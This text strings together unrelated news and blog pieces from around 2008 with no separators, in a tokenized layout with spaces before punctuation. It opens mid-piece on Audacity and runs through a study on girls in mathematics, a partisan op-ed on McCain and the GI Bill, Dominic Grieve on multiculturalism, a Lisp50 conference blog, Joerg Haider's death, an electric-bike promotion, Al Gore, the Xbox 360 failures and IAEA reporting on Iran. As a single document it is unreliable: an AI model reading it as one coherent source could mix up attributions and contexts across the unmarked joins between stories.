The Audacity toolbar allows for quick sliding / placement of tracks ( double - ended arrow ) , and track selection , even across multiple tracks ( the I ) .
Audacity can be enhanced with plugins , and being open source , these plugins are encouraged ( and are occasionally added to the main project ) .
Naturally , there are other ways to get involved with the project , even if programming or a Google 's Summer of Code Project is n't your forte .
Audacity seems particularly eager for people able to help translating their documentation and website into other languages , as well as offer foreign language support .
October 1 , 2008 , Providence , RI --- Do females intrinsically have less ability than males to excel in mathematics at the very highest level ?
Conventional wisdom seems to say yes .
Harvard University president Lawrence Summers also seemed to give credence to this notion in 2005 when he suggested that it might account in part for the very small number of women professors in elite university math departments .
But a new study proclaims a resounding " no " , providing a fact - based case to back up this conclusion .
The study , " Cross - Cultural Analysis of Students with Exceptional Talent in Mathematical Problem Solving , " appearing in the November 2008 issue of the Notices of the American Mathematical Society , brings together decades of data from several extremely high - level mathematics competitions for young people .
These data show that there exist many females with profound intrinsic ability in mathematics .
What is more , whether this ability is identified and nurtured is highly dependent on socio-cultural , educational , or other environmental factors .
In the United States , these factors keep many boys as well as most girls from developing their mathematical talents to the fullest .
Girl Math Whizzes Found in Cultures that Value Math
The main part of the study examines participation in the International Mathematical Olympiad ( IMO ) , a highly challenging , nine - hour , six - problem essay style examination taken by some of the most mathematically gifted pre-college students the world over .
In recent years as many as 95 countries have sent 6 - member teams to compete in the IMO .
The study found that there have been numerous girls who have excelled in the IMO ; however , the frequency with which girls of medal - winning ability are identified varies greatly from country to country .
Even some relatively small countries , such as Bulgaria and Romania , can field highly successful IMO teams .
" [ W ] hat most of these countries [ that excel in the IMO ] have in common are rigorous national mathematics curricula along with cultures and educational systems that value , encourage , and support students who excel in mathematics , " the study says .
Since 1974 , the highly - ranked Bulgarian , East German / German , and USSR / Russian IMO teams have included 9 , 10 , and 13 different girls , respectively .
By contrast , during that same time period , the US teams included just 3 girls .
While only a few students per year typically achieve a perfect score of 42 points in this extremely difficult exam , multiple girls have been among them , including Evgenia Malinnikova of the USSR who missed by only one point achieving a perfect 42 three years in a row .
One of the study 's findings is that many of the students from the United States who participate in the IMO are immigrants or children of immigrants from countries where education in mathematics is valued and mathematical talent is nurtured .
A similar pattern holds for data from other highly challenging math competitions , including the USA Mathematical Olympiad and the Putnam Mathematical Competition for undergraduate students , also analyzed in the study .
In particular , Asian - American and white girls who are immigrants from Eastern Europe are well represented in proportion to their percentages of the US and Canadian populations among the very top students identified in these math competitions .
It is only US - and Canadian - born white and historically underrepresented minority girls who are underrepresented --- underrepresented by 50 - fold or more relative to Asian girls educated in the same school systems , the study concludes .
The study found that , when raised under some conditions , girls constitute 11 % to 24 % of the children identified as having profound mathematical ability .
Raised under other conditions , girls were 30 - fold or more underrepresented .
The 8:1 to 3:1 ratio of boys to girls is likely an underestimate .
In a truly gender - neutral society , the real ratio could well be close to 1:1 ; however , we currently lack ways to measure it , the study suggests .
US Culture Discourages Girls --- and Boys
Study co-author Titu Andreescu of the University of Texas at Dallas believes , " Innate math aptitude is probably fairly evenly distributed throughout the world , regardless of race or gender .
The huge differences observed in achievement levels are most likely due to socio-cultural attributes specific to each country . "
Some countries routinely identify and nurture both boys and girls with profound mathematical ability to become world - class mathematical problem solvers , while others , including the USA , only rarely identify girls of this caliber .
In addition , social pressures conspire to discourage girls from pursuing math .
" [ I ] t is deemed uncool within the social context of USA middle and high schools to do mathematics for fun ; doing so can lead to social ostracism , " the report says .
" Consequently , gifted girls , even more so than boys , usually camouflage their mathematical talent to fit in well with their peers . "
The study also looks at the representation of women among the faculty in five of the very top US research university mathematics departments .
Just 20 % of the women in these elite departments were born in the United States .
Of the 80 % born elsewhere , many are immigrants from countries in which girls are frequently members of IMO teams .
The study found a similar race / ethnicity / birth country / gender profile among US participants in the IMO and its training camp as among the faculties of these outstanding math departments .
" Thus , we conclude that the mathematics faculty being hired by these very highest - ranked research universities reflects the pool of IMO medal - caliber students of mathematics coming through the pipeline , " the study says .
" The U.S. culture that is discouraging girls is also discouraging boys , " says Janet Mertz , a University of Wisconsin - Madison professor of oncology and lead author of the study .
" The situation is becoming urgent .
The data show that a majority of the top young mathematicians in this country , male as well as female , were not born here . "
Co-author Joseph A. Gallian , professor of mathematics at the University of Minnesota Duluth , says , " Just as there is concern about the US relying on foreign countries for our oil and manufactured goods , we should also be concerned about relying on others to fill our needs for mathematicians , engineers , and scientists . "
" [ T ]he myth that females cannot excel in mathematics must be put to rest , " the report emphasizes .
" Teachers , guidance counselors , parents , principals , university presidents , the lay public , and , most importantly , girls themselves need to be informed about the fact that females can excel in mathematics , even at the very highest level . "

MORE THAN a few people have been puzzled by Sen. John McCain ’s dogged opposition to the updated GI Bill of Rights now before Congress .
The dissonance between McCain ’s military - man image and his actions on this issue have introduced a jarring note to his presidential aspirations -- and have highlighted the shoddy treatment many Iraq war veterans have received .
Why would a Vietnam War veteran and former prisoner of war , a man who is personally acquainted with the difficulties vets can face in returning to civilian life , join President Bush in opposing a popular bipartisan bill to support the troops ?
Is n’t fixing the education benefit in the bill -- one that has shortchanged far too many veterans for years -- a political no - brainer in an election year ?
The 75 senators who recently voted for it certainly thought so .
Over the Memorial Day weekend , Sen. Barack Obama expressed some well - timed astonishment at McCain ’s opposition , and the two have been feuding about it ever since .
The media and pundits seem perplexed , collectively suggesting :
That ’s not the John McCain we know .
Which is true :
It is the John McCain they do n’t know .
If the media were n’t so mesmerized by the McCain image they have long promoted and instead got to know the McCain record , they would realize that there is nothing surprising or inconsistent about his position on the GI Bill .
For years he has opposed legislation that veterans and their advocates deem vital .
In doing so , he is simply being true to the contemporary conservative wing of the GOP and its leader , George W. Bush , in opposing social programs and benefits for individuals , even if those individuals happen to be veterans .
The only surprise is that anyone finds this surprising .
This time , though , McCain is swimming against the tide of history .
The original GI Bill -- signed into law in 1944 -- was one of the most important laws every adopted by Congress .
It transformed the nation after World War II in epic fashion , with generous college benefits , stipends , subsidized mortgages , business loans and job training and placement .

Veterans got free rides to any college that would accept them .
Tuition , books , housing and living expenses were all covered , giving rise to a new generation of scientists , inventors , teachers , doctors , civic leaders and artists .
Low - interest , no - money - down home loans backed by the government made it cheaper to buy than to rent .
Suburbia , widespread homeownership , college as a majority aspiration , the middle class -- all were built on the back of the GI Bill .
It reinvented the American dream .
Bob Dole and George McGovern went to school on the GI Bill .
So did Clint Eastwood and Paul Newman .
So did 14 Nobel Prize winners .
So did 7 million other World War II veterans .
Today ’s GI Bill , however , is a pale shadow of the original , particularly when it comes to college , as Congress has not kept the benefits in line with the rising cost of higher education .
The World War II - era living stipend is gone ; in its place , members of the military must agree to a $ 100 monthly payroll deduction to receive the college aid .
An education benefit that sent WWII vets to Yale now wo n’t cover four years at the average public university , though many recruits do n’t understand this when they sign up .
Sen. James Webb ( D - Va. ) , a former Marine who served in Vietnam and who was President Reagan ’s Navy secretary , has made restoring the GI Bill education benefits one of his signature issues ; it was his bill , co-sponsored by Sen. Chuck Hagel ( R - Neb. ) , that cleared the Senate over McCain ’s and Bush ’s opposition .

McCain argues that making the education benefits too generous will hurt retention , as enlistees will leave for college after three years rather than reenlist .
McCain ’s position makes sense only by overlooking the fact that the main retention ( and recruiting ) problems facing the military are the Iraq war and the scandals plaguing military and veterans healthcare .
( The most recent outrage : In a Memorial Day speech , Secretary of Veterans Affairs James Peake downplayed the seriousness of brain trauma suffered by tens of thousands of servicemen in Iraq and Afghanistan , calling many of their diagnoses “ overblown ” and likening them to youth football injuries . )
--
The inadequacy of the military ’s prime recruiting tool -- subsidized college educations -- is hurting recruitment too , and Webb argues this can be fixed only by fixing the GI Bill .
He says McCain , a friend , “ is missing the boat ” by siding with the Bush Pentagon rather than veterans groups .
Webb points to a Congressional Budget Office analysis that found any possible losses in retention caused by his bill would be balanced by the increases in recruitment it would generate .
McCain ’s rationalization for opposing the bill may not hold water , but his stance makes perfect sense in light of his record .
From 2004 to 2006 , the Disabled Veterans of America gave him annual scores ranging from 50 % to the most recent 20 % when it comes to supporting the group ’s legislative priorities .
The Iraq and Afghanistan Veterans of America gave him a grade of “ D ” in its most recent analysis of voting records .
The American Legion says he is dead wrong on the GI Bill , as does the Veterans of Foreign Wars .

When Obama ( who has averaged an 86 % rating from the Disabled Veterans of America ) criticized McCain on the GI Bill , the Arizona senator angrily suggested that Obama ’s status as a non-veteran rendered his opinions on military matters worthless ( an odd stance , as this standard would also discount the opinions of 85 % of American men , 98.8 % of American women and two - thirds of Congress ) .
Then he invited a look at his own record by asserting , “ I take a back seat to no one in my affection , respect and devotion to veterans . ”
So let ’s take McCain up on his invitation .
Here is how he has stood on recent legislation supported by major veterans organizations :
* On Webb ’s GI Bill , he expressed opposition , and he was AWOL when it was time to vote on May 22 .
* Last September , he voted against another Webb bill that would have mandated adequate rest for troops between combat deployments .
Advertisement
* On a badly needed $ 1.5 - billion increase for veterans medical services for fiscal year 2007 -- to be funded through closing corporate tax loopholes -- he voted no .
He also voted against establishing a trust fund to bolster under - budgeted veterans hospitals .
* In May 2006 , he voted against a $ 20 - billion allotment for expanding swamped veterans medical facilities .
* In April 2006 , he was one of 13 Senate Republicans who voted against an amendment to provide $ 430 million for veterans outpatient care .
* In March 2004 , he voted against and helped defeat on a party - line vote a $ 1.8 - billion reserve for veterans medical care , also funded by closing tax loopholes .

Before the Senate voted on Webb ’s GI legislation , McCain offered what he called a compromise bill , but it was rejected .
Webb pointed out that there really was no compromise in McCain ’s proposal because it would have excluded most veterans by offering full education benefits only to those with multiple enlistments , even though 70 % to 75 % of enlistees leave after one tour .
Compare McCain ’s stingy standards with the original GI Bill :
Any veteran who served 90 days during World War II , in combat or not , earned full benefits .
It is Webb ’s bill that represents the reasonable compromise between the gold standard set for the “ greatest generation ’s ” original GI benefits and what is doable in today ’s economy : a GI Bill that will truly pay for a college education after three years of service , without the onerous payroll deduction .
So here is where the McCain image and reality part company .
It is certainly true that his affectionate and respectful rhetoric for America ’s servicemen and women takes a back seat to no one .
But when it comes to improving the health and education of our veterans , McCain ’s record leaves them stranded by the side of the road .
Multiculturalism in the UK has left a " terrible " legacy , creating a vacuum that has been filled by extremists from across the political spectrum , the shadow home secretary , Dominic Grieve , warns today .
In an interview with the Guardian on the eve of the Conservative party conference , Grieve says that " long - term inhabitants " have been left fearful , while second - and third - generation immigrants have felt alienated and unsure what British values stand for .
He also warns against downplaying Britain 's Christian heritage .
His remarks on such a contentious area come as an ICM poll for the Guardian shows that Labour has narrowed the gap on the Tories , whose lead over the government is now into single figures - the lowest since April .
The survey puts the Conservatives on 41 % , down three points from last month .
Labour is up three on 32 % with the Liberal Democrats on 18 % .
The poll - the first to be carried out after the end of the Labour conference and the resignation of Ruth Kelly - suggests that voters may be returning to Labour amid fears of a worldwide economic crash , and will underline fears in the Tory party that it has yet to " seal the deal " with the electorate .
Based on the poll , the Conservatives would struggle to win an overall majority at an immediate general election .
With polls now suggesting a narrowing of the gap between the two main parties , David Cameron knows he needs to outline how the Tories would address the economic crisis and make a difference in government .
The conference has been tightly organised to focus on the economy , the NHS and " fixing broken Britain " .
But Grieve today ventures into the sensitive subject of multiculturalism in some of the strongest remarks by a Tory in recent times .
He tells the Guardian : " We 've actually done something terrible to ourselves in Britain .
In the name of trying to prepare people for some new multicultural society we 've encouraged people , particularly the sort of long - term inhabitants , to say ' well your cultural background is n't really very important ' . "
He adds : " In this vacuum the BNP rise and Hizb ut - Tahrir rises .
They 're two very similar phenomena of people who are experiencing a form of cultural despair about themselves , their identity .
And it 's terribly easy to latch on to confrontational and aggressive variants of their cultural background as being the only way to sort of reassure themselves that they can survive and have an identity . "
The shadow home secretary said multiculturalism was inspired by the " understandable " desire to make people feel comfortable .
But he added : " The idea behind it was [ to ] create the melting pot .
But the melting pot needs the ingredients of people 's confidence in themselves as they come together .
And if it is n't there I think we 've done ourselves huge damage . "
He also raises fears that " fundamental Islam " is restricting debate .
" Our country has adapted because people have been tolerant which has often required a lot of forbearance and acceptance of things they did n't like .
We all have to accept things we do n't like .
That is how Britain has evolved .
When I go and address an Islamic audience I always point this out . "
An Anglican , Grieve praises the contribution all the major religions have made to Britain .
But he says that people should not forget Britain 's Christian heritage .
" The role of Christianity is really rather important .
It ca n't just be magicked out of the script .
It colours many of the fundamental viewpoints of British people , including many who 've never been in a church . "
Grieve says he would restore traditional British justice by conducting a review into whether to scrap fixed penalties for " dishonesty offences " , such as shoplifting , though not motoring offences .
• ICM interviewed a random sample of 1,012 adults aged 18 + by telephone between September 24 and 25 .
Interviews were conducted across the country and the results have been weighted to the profile of all adults .
This was a totally different crowd than what I saw at the DSM workshop .
There were lots more Americans here .
You had a mix of bearded Lisp Hackers , a few not - yet - middle - aged guys who were running significant projects , and then some younger guys that were either still in college or were not out for very long .
To understand the conference , you ’ve got to understand the backdrop .
I ’d just sat through a day of presentations that were mostly focused on Java , Eclipse , and UML diagrams .
The “ last word ” of the day was from a Small Talk programmer who said that the competing tools in his area of work had not improved upon the solutions that he ’d had 15 years ago or so .
Educators attending the symposium were talking over lunch about how they could n’t find good examples for applying some of the concepts they were teaching .
Anybody I met , I would say to them : “ I ca n’t believe I ’m going to see John McCarthy and Alan Kay tomorrow ! ”
This did n’t mean anything really to most people I tried to chat with .
Collectively , the net effect of the preceding day was to produce a mild sensation of frustration , disappointment , and alienation .
I was nearly late for the opening session of Lisp50 .
I rushed in just barely in the nick of time … only to find that Lisp50 was starting ten minutes late or so .
There was no posting of the schedule anywhere that I saw while the workshop I was in the previous day had a copy of the schedule at every seat and even a booklet of all the papers to be presented .
Add to this the fact that many of the Lisp speakers had some sort of trouble with their Power Point slide and that there was no slot on the schedule for a break for an evening meal … and it just appeared that collectively the Lisp community was doing everything it could to meet its own stereotypical expectations !
So the first “ talk ” was Guy Steel and Richard Gabriel re-enacting a talk they gave back in 1993 .
This was amusing in places – the audience laughed in most of the same places as the 1993 audience did– but it was a little frustrating .
I mean , we have Steel and Gabriel on stage … and they ’re reading .
I want to know what they have to say about right now .
I want them to preach to the choir .
I want them explain how to finally win the “ language wars ” and why it matters .
Something .
Anything !
Instead we get a play by play of how Lisp communities evolved and coagulated in the seventies and eighties .
The net effect of this was to leave the impression that we ’re reduced to the significance level of , say , a confederate civil - war reenactor .
The battle is over .
We lost .
There ’s nothing left but pin down the final details of the history of our side so we can bury it all .
Yes , that ’s it … that ’s is exactly .
I felt like I was at a funeral !
This “ talk ” set a tone that our proceedings were going to be more about nostalgia than anything else .
( I ’m not saying this was n’t interesting …
I ’m just talking about the tone here given the context .
Maybe I was the only one the felt this way , but I think the general pulse of the crowd was mildly uncomfortable because of these sorts of unspoken memes floating around in our collective unconsciousness . )
JonL
White was the next speaker .
I simply cannot do justice to what he said and what he represents .
Suffice it to say , if all you know about Lisp is some stuff you read in a Paul Graham essay and a few textbooks here and there … then you really do n’t know anything .
This man has a tremendous intellect … and has had a hand in nearly everything as far as Lisp is concerned .
( Did I see that right on the slide of specific language contributions that he was responsible for defun ?
I wish I had that slide ….)
Fifty years from now , I ’m going to be telling people , “ I saw JonL at the Lisp50 conference . ”
I cannot do justice to this guy ’s presentation , so here ’s just a few tidbits :
* He used several Alan Perlis quotes to set the tone .
These were all great quotes ; the same ones from SICP that inspire me so much .
JonL really misses Perlis .
* He mentioned something about dealing with the archetypal “ bipolar Lisp programmer ” types on the job and exclaimed , “ how can you supervise a Lisp guy ?!
You just take what he does … ! ”
* JonL was responsible for hiring Stallman at the MIT AI Lab .
Stallman has contested this and claimed that some random administrator was responsible .
JonL explained that the administrator ’s do n’t decide anything – the way you get in is by making friends with someone in the lab .
* JonL encouraged us all to go to the International Lisp conference .
“ Lisp is the back forty for a lot of people , ” he said .
( That is , you do whatever you need to do when you work for the master , but if the work is for yourself , a lot of people tend to do it in Lisp . )
JonL spoke about growing up in the Ozarks .
He talked about how his parents influenced him intellectually and genetically .
He talked about how racist everyone was there and how he took the slurs personally somehow … .
He talked about how he ended hanging out with Jews and how he sort of became , as it were , an “ honorary Jew ” because they figured if he was so smart , he must be a Jew , too .
( I ’m trying not to mangle this too badly . )
So Sussman asks him one day , “ Why are Jews so smart ? ” Now , JonL was pained at recounting the answer he gave .
He confessed to having picked up on some the racism that was endemic to the Ozarks .
“ Uh … must be their genes , ” he ’d said back then .
Sussman was very irritated at this answer .
“ WRONG , ” he said , “ it ’s the LAW ! ”
I have no idea how many people “ got ” this .
JonL was n’t too sure either .
The default assumption is that we ’re all rabid libertarians and atheists , I suppose .
JonL explained that Sussman was referring to the Torah … the Jewish scriptures .
Sussman argued that because Jewish fathers are required to teach their children how to read and write– so they could understand the Law– that this somehow gave them a fantastic intellectual foundation .
JonL referred to a talk that Sussman gave somewhere– it was extemporaneous , but better than most prepared talks .
( I want to see this talk if anyone finds a recording ! )
JonL was totally blown away by this talk … the best thing he ’d ever heard .
But in it , Sussman argued that intelligence was transmittable and improvable .
Somehow , if you can ( legitimately ) learn more words , you expand your ability to think .
This tied into symbolic thinking being about giving names to things .
( This reminds me of that strange story in Genesis about Adam naming the animals in the garden of Eden . )
Sussman said , “ great ideas can be understood by an ordinary person . ”
( That ’s a very encouraging thought .
I suppose there ’s hope even for us “ average developers . ”
This is all the more reason to continue learning a new programming language every year or so .
It kind of gives one a little more respect for all of those among the USA ’s founding fathers that could read and write Latin , Greek , and Hebrew … . )
JonL had spoken earlier about how he ’d gotten a great prep - school type education even though he grew up out in the middle of nowhere in the Ozarks .
Farming and industry were all dead there , but … they still had this heritage of education .
JonL pointed out how , for us Americans , this traces back to the Puritans .
The fundamental concept of our form of government is that man ’s government cannot work .
That ’s why you have all of those checks and balances– those Puritan - types did not trust man to get things right !
( Note to self : compare and contrast this with socialism sometime .
Try not to use the word “ hubris ” gratuitously . )
Our education was meant to provide a check on our untrustworthy governmental institutions – but just look at how things are developing in , say , the California public schools .
Things do not look good ; we ’ve lost something ….
That ’s the gist of JonL ’s talk based just on my hasty and imperfect notes .
( That last “ tidbit ” sort of raged out of control there …. )
Please feel free to post corrections and clarifications if you feel they are required .
I did n’t get the feel that he was a raving evangelical or anything , but I was surprised by the philosophical bent to his talk .
But what do you expect from a guy that cuts off his tie with a pair of pruning shears …!

Advertisement Austrian far - right politician Joerg Haider has been killed in a road accident , police say .
Mr Haider suffered severe head and chest injuries after his car came off the road in Carinthia , his political base .
Police investigating the crash said he had been driving alone .
The 58 - year - old was leader of the Alliance for Austria 's Future , and was known for his anti-immigration and anti-EU policies .
The Alliance was one of two right - wing parties which did better than expected in general elections last month , fuelling speculation of a possible role in a ruling coalition .
JOERG HAIDER : KEY DATES 1950 : Born in Upper Austria 1976 : Joins Freedom Party 1986 : Elected party 's leader 1989 : Elected governor of Carinthia 2000 : Resigns as party leader 2005 : Founds Alliance for Austria 's Future
Obituary : Joerg Haider Death shocks friends and foes
He had reportedly been due to attend his mother 's 90th birthday celebrations later in the day .
" For us this is the end of the world , " the deputy leader of Mr Haider 's Alliance for Austria 's Future , Stefan Petzner , told Austrian news agency APA .
Austria 's President Heinz Fischer said Mr Haider 's death was a " human tragedy " , while Chancellor Alfred Gusenbauer described him as someone who had shaped Austria 's domestic and political landscape over decades , according to the Associated Press news agency .
EU sanctions Mr Haider was a divisive figure who gained notoriety after he became leader of the Freedom Party in 1986 .
In 1991 his term as governor of the province of Carinthia was interrupted , after he made comments praising employment policies of Nazi Germany .

But he was re-elected in 1999 and 2003 .
In 2000 the EU imposed sanctions against Austria in a protest over his party 's role in government .
In 2005 Mr Haider left the Freedom Party and founded the Alliance for Austria 's Future , which scored its best result so far in elections last month , gaining 11 % of the vote .
This was , however , well below the 27 % which the Freedom Party won under his leadership in 1999 - a high mark in Mr Haider 's electoral career at national level .
" With his passing Austria has lost a great political figure , " said Heinz - Christian Strache , who had taken over as leader of the Freedom Party after Mr Haider left .

We love electric bikes – So should you
Although not as popular as mopeds or traditional motorcycles ( yet ) , electric bikes have certainly seen their use increase over recent years .
There are many reasons for this – Electric bikes have become more sleek and stylish , fuel prices have gone through the roof and people are much more environmentally aware than they were 10 - 15 years ago .
Also in terms of speed , electric bikes now hold their own compared with other modes of transport .
Granted they are not as quick as scooters or motorcycles , but at around 15 to 20 miles per hour , they are quick enough for most .
Add to this that fact that Electric bikes are considered much safer than motorcycles ; they are cheaper to purchase and a lot cheaper to maintain and you can use them as part of a personal fitness routine , what ’s not to like ?
Read on for some more reasons why everyone ’s choosing electric bikes …
Counting Down the Benefits of Riding Electric Bikes
Now , what are the additional benefits of purchasing and riding electric bikes ?
Take a look at the following list :
Electric bikes offer a safer , offering a more controlled driving experience .
When you ’re navigating through heavy traffic , the extra push provided by the motor of the electric bike will allow you to gain stability and controlled speed to avoid dangers .
The same thing holds true when you are going up a steep incline ; the electric motor allows for more control .
2. Electric bikes are cheaper to buy and maintain .
Electric bikes are an ideal alternative form of transport due to the low running costs ( think pence not pounds ) .
You simply need to find a mains socket , plug in the battery and wait a few hours for the battery to get fully charged and you ’re good to go !
3. Electric bikes have an extended range .
Another benefit of riding an electric bike is that it gives you the ability to cycle further , explore more and get outside more than if you were demotivated by a push pedal bike .
If you want to keep fit some electric bike models allow you to simply manually pedal without engaging the motor .
The best of both worlds .
4 . Unlike motorcycles , you do not need to have a license to own and drive electric bikes in the UK .
Electric bikes offer a hassle - free way of owning a motorized vehicle – without having to apply for licenses or permits .
5 . You can use an electric bike to drive yourself to and from work – in your suit , without breaking a sweat .
If you need to get somewhere quick , in an environmentally sound way , but still looking professional ( or just not half dead ) , an electric bike could be the answer .
With all these benefits and more , there ’s absolutely no reason why you should say no to the prospect of owning an electric bike , so why not buy one now ?
Gore : ' Civil disobedience ' needed to halt coal plant construction RAW STORY
Published : Thursday September 25 , 2008
Print This Email This Former vice president Al Gore urged young environmental activists to engage in " civil disobedience " to halt the construction of coal plants that do not mitigate their carbon emissions .
Gore , who won a Nobel Prize for his environmental activism , was speaking to a gathering of the Clinton Global Initiative , created by the former president he served with , Reuters reports .
" If you 're a young person looking at the future of this planet and looking at what is being done right now , and not done , I believe we have reached the stage where it is time for civil disobedience to prevent the construction of new coal plants that do not have carbon capture and sequestration , " Gore told the Clinton Global Initiative gathering to loud applause .
" I believe for a carbon company to spend money convincing the stock - buying public that the risk from the global climate crisis is not that great represents a form of stock fraud because they are misrepresenting a material fact , " he said .
" I hope these state attorney generals around the country will take some action on that . "
Gore and other environmentalists say coal plants are among the biggest emitters of carbon pollution , which contributes to global warming .
The New York Times reports that Gore did not provide more detail on what he wanted people to do .
Mr. Gore did not elaborate on his call for action .
And almost as soon as the words civil disobedience  were out of his mouth , Mr. Clinton , moderating a panel that Mr. Gore shared with the singer Bono , the president of Liberia , the chairman of Coca - Cola and Queen Rania of Jordan , turned to the queen to ask whether Middle Eastern countries might ever become models of clean energy usage .
The discussion continued in a less - fiery vein from there .
Despite intense advertising from the industry , Gore said so - called clean coal technology " does not exist . "

When his fourth Xbox 360 video game console died in April , Chris Szarek was n’t surprised .
The Chicopee , Mass . gamer was accustomed to the hardware failures that became known throughout the Internet as RROD , or the “ red rings of death ” which flash when the console becomes inoperable .
A 40 - year - old photographer , Szarek was a hardcore Microsoft fan who spent more than $ 1,000 on his games .
But each time one of his Xbox 360 consoles failed , he had to spend time convincing Microsoft ’s tech support that they should send him a new console .
Each time he got a refurbished console as a replacement ( a machine that had been returned to a repair center in Texas , fixed as much as possible , and then shipped back out ) .
When he complained on the Internet and to the media about the shoddy product and poor customer service , people branded him a cry baby and wrote him off as a statistical anomaly .
But by the spring of 2008 , Szarek was vindicated .
There were at least a million or two other people like him .
Szarek ’s fourth machine lasted almost two years , experiencing the same short life that many other Xbox 360s suffered .
Microsoft replaced these machines for free under the warranty that it announced on July 5 , 2007 , for defective Xbox 360s exhibiting what it more politely called the “ three flashing red lights . ”
That warranty program cost Microsoft up to $ 1.15 billion , but the loss of face and loyalty among gamers in the fierce console war with Nintendo and Sony has been immeasurable .
Szarek , who became a spokesman for dispossessed defective Xbox 360 owners , played a part in making Microsoft acknowledge its console quality problem .
This is the unauthorized tale of how Microsoft lost its chance to become the leader in the biggest market it has attacked beyond its twin monopolies in Office and Windows software .
Rival game console maker Nintendo out - thought the larger players Microsoft and Sony by designing the Wii game console with a clever , intuitive game controller .
Even so , Microsoft could have captured more gamers during this product generation , yet the RROD problem held it back .
The Xbox 360 ’s defect problem will go down as one of the worst snafus in consumer electronics history .
Its own worst enemy
Microsoft knew it had flawed machines , but it did not delay its launch because it believed the quality problems would subside over time .
With each new machine , the company figured it would ride the “ learning curve , ” or continuously improve its production .
Even though Microsoft ’s leaders knew their quality was n’t top notch , they did not ensure that resources were in place to handle returns and quickly debug bad consoles .
There were plenty of warning signs , but the company chose to ignore them .
The different parts of the business were n’t aligned .
It reminds me of the German war machine just before World War I , as chronicled by Barbara Tuchman in the classic history book , “ The Guns of August . ”
The German generals were intent on keeping their trains on time ; but the leaders overlooked their chances for stopping the war altogether .
The Schlieffen plan called for them to strike first .
Once the Russians and French mobilized , the Germans had to move into action .
They marched off blindly into tragedy .
Likewise , Microsoft ’s strategy depended on beating its rivals to market .
It could n’t afford to stop and delay the launch in order to solve its quality problems , or so upper management believed .
What Microsoft ’s leaders did n’t realize was that getting to market first with a flawed machine would only win them a battle ; and it risked the loss of the war .
“ They got enamored with the idea of the Microsoft army rolling everything out at the same time , ” said one knowledgeable source who asked not to be identified .
The quality problem negated much of the advantage of going first , and it has delayed the company ’s plan to aggressively market the console and slash its prices .
( Microsoft disputes this point ; it cut the price of all three versions of its Xbox consoles by $ 50 to $ 79 on Wednesday .
And the company believes it will sell more boxes than Sony will .
But prices ought to be lower still during this stage of the console life cycle ) .
That has stopped the company from reaching the broader market of consumers that Nintendo has won over .
It has lowered its ambitions , hoping instead just to get a clear edge on third - placed Sony .
The future profits that the company once hoped for are now likely to wind up in Nintendo ’s pockets .
Microsoft ’s top game executive , Robbie Bach , president of the Entertainment & Devices group , said at a dinner in July that Microsoft ’s own research shows that gamers have largely forgiven the company for defective Xbox 360s .
Microsoft has still sold more Xbox 360 consoles than Sony to date .
But there is no doubt that the company has lost considerable good will among gamers .
Before Microsoft offered free replacements , connsumers grumbled that they had to turn to forums , such as those on Ars Technica , to vent and to find solutions to problems that the company did n’t openly discuss .
And for a couple of months now , Sony ’s PlayStation 3 has been outselling the Xbox 360 in the U.S. for the first time .
“ Fundamentally , their thinking shows that they are a software company at heart , ” said one veteran manufacturing executive .
“ They put something out and figure they can fix it with the next patch or come up with a bug fix . ”
The terrifying part of the story is that this kind of problem — where technology fails and no one knows what to do about it — can happen to any company .
About this story
I asked Microsoft to confirm or deny 35 different facts contained in this story .
Instead , I received a formal statement from a Microsoft spokesperson , saying the company had already acknowledged an “ unacceptable number of repairs ” to Xbox 360 consoles and responded to the hardware failures with a free replacement program .
The statement also said , “ This topic has already been covered extensively in the media .
This new story repeats old information , and contains rumors and innuendo from anonymous sources , attempting to create a new sensational angle , and is highly irresponsible . ”
I do n’t think this story is sensational .
I have tried to verify the facts over several years .
I view this story as the last chapter for my book on the making of the Xbox 360 , “ The Xbox 360 Uncloaked : The Real Story Behind Microsoft ’s Next - Generation Video Game Console . ”
The facts revealed themselves slowly , emerging from the day - to - day stories that I wrote about the game business .
Some people might consider this post mortem to be ancient history .
But the reverberations are still playing out today .
They help explain why Microsoft is n’t being aggressive with its price cuts and why gamers are n’t getting bargains on hardware as they did the last generation .
While I talked to many people for this story , few were willing to let me use their names .
As you will see , not every source is anonymous , and we have included the viewpoint of Microsoft executives from past interviews .
The details are interesting because they offer a deeper look into how the console business runs than is otherwise available .
Microsoft , for instance , still has n’t perfected its Xbox 360 manufacturing process .
In the absence of a precise chronology from Microsoft , some anonymous sources have tried to describe what happened .
But the history of the decision making and inside story of what happened on the RROD has never been told , until now .
( Please check out our GamesBeat 09 conference on March 24 ) .
The IAEA ’s latest report on Iran ’s nuclear program was circulated to the Board of Governors this week .
It has not been released to the general public , but it is widely being hailed as a damning condemnation of Iran by the mainstream media .
The Washington Post headline read , “ U.N. Agency at ‘ Dead End ’ as Iran Rejects Queries on Nuclear Research . ”
The article states , “ The apparent standoff was detailed in a report that also described substantial gains by Tehran in its efforts to make enriched uranium , the fuel used in commercial nuclear reactors and nuclear weapons . ”
The Post fails to point out that the IAEA has also confirmed that Iran has produced only low - enriched uranium , not the highly - enriched uranium required for nuclear weapons .
The Post quotes Ali Asghar Soltanieh , Iran ’s ambassador to the IAEA , as saying , “ After numerous inspections there was no evidence on diversion of nuclear activities and materials for military objectives . ”
But it fails to point out that this is not only attributable to Iranian denials , but to the IAEA report itself , which states that the IAEA “ has been able to continue to verify the non-diversion of declared nuclear material in Iran . ”
That line is taken verbatim from the IAEA ’s previous report last May .
Just before issuing that report , IAEA Secretary General noted , “ We have n’t seen indications or any concrete evidence that Iran is building a nuclear weapon and I ’ve been saying that consistently for the last five years . ”
A CBS News headline declared , “ IAEA : Iran To Upgrade Missile For Nuke Use , ” falsely suggesting that this is a conclusion drawn by the agency .
The subtitle more accurately notes , “ U.N. Agency Presents Report Allegedly Showing Iran ’s Plans To Redesign Weapons . ”
The U.S. Is known to have been the principle nation responsible for supplying the reports to the IAEA , although it is reported that other Western intelligence agencies have also been involved .
Iran insists that the documents have been fabricated .
The documents , which have come to be known as the “ alleged studies ” by the IAEA , have become a key obstacle to the IAEA ’s efforts to verify the peaceful nature of Iran ’s nuclear program .
The report in May noted significant progress in other areas , leaving the “ alleged studies ” the key remaining outstanding issue .
That report also emphasized “ that the Agency has not detected the actual use of nuclear material in connection with the alleged studies . ”
After the latest report , IAEA officials who have talked to the press have been widely quoted anonymously as describing the agency ’s efforts in Iran as being at a “ dead end ” .
One unnamed official said , “ Iran has so far not been forthcoming in replying to our questions and we seem to be at a dead end there . ”
Another press account quotes an unnamed official saying , “ We seem to have reached a dead end … Gridlock . ”
